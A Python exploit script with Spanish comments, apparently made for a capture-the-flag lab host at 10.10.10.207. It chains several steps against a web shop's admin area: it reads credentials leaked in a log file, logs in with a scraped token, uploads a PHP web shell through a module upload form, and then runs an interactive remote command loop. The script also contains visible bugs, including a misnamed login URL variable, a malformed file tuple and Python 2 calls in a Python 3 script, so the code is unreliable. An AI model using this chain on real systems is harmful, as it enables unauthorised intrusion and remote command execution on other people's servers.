``` python
#!/usr/bin/python3

import requests
import re
import sys
import signal
import time
import pdb

from pwn import *

# Ctrl+C
def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)
	
signal.signal(signal.SIGINT, def_handler)

# Variables globales
credential_exposure_url = "http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt"
login_urt = "http://10.10.10.207/shop/admin/login.php"
upload_url = "http://10.10.10.207/shop/admin/?app=vpmods&doc=vqmods"
rce_url =  "http://10.10.10.207/shop/vqmod/xml/rce.php"

burp = {'http': 'http://127.0.0.1:8080'}

def makeRequest():
	
	# Conseguir credenciales expuestas en una dirección, obtenido gracias al exploit 45267.py (searchsploit)
	r = requests.get(credential_exposure_url)
	
	username = r.text.split(' ')[1]
	password = r.text.split(' ')[3]
	
	# Obtener una sesión para ir arrastrando las cookies en próximas peticiones
	s = requests.session()
	
	r = s.get(login_url)
	
	token = re.findall(r'name="token" value="(.*?)"', r.text)[0]
	
	# Data que requiere la petición a la hora de loguearnos
	login_data = {
		'token': token,
		'redirect_url': 'http://10.10.10.207/shop/admin/',
		'username': username,
		'password': password,
		'login': 'true'
	}
	
	r = s.post(login_url, data=login_data)
	
	# Subida de fichero malicioso
	filename = open("rce.php", "r")
	
	file_to_upload = {'vqmod': {'rcp.php', filename, 'application/xml'}}
	
	upload_file_data = {
		'token': token,
		'upload': 'Upload'
	}
	
	r = s.post(upload_url, data=upload_file_data, files=file_to_upload, proxies=burp)
	
	# Ejecución Remota de Comandos (RCE)
	post_data = {
		'cmd': 'whoami'
	}
	
	r = requests.post(rce_url, data=post_data)
	print("\n[+] URL: http://10.10.10.207/shop/vqmod/xml/rce.php\n")
	print(r.text + "\n")
	
	while True:
		command = raw_input("[+] Comando: ")
		
		post_data = {
			'cmd': '%s' % command.decode('utf-8').strip('\n')
		}
		
		r = requests.post(rce_url, data=post_data)
		print("\n" + r.text)
		
if __name__ == '__main__':
	
	makeRequest()



```
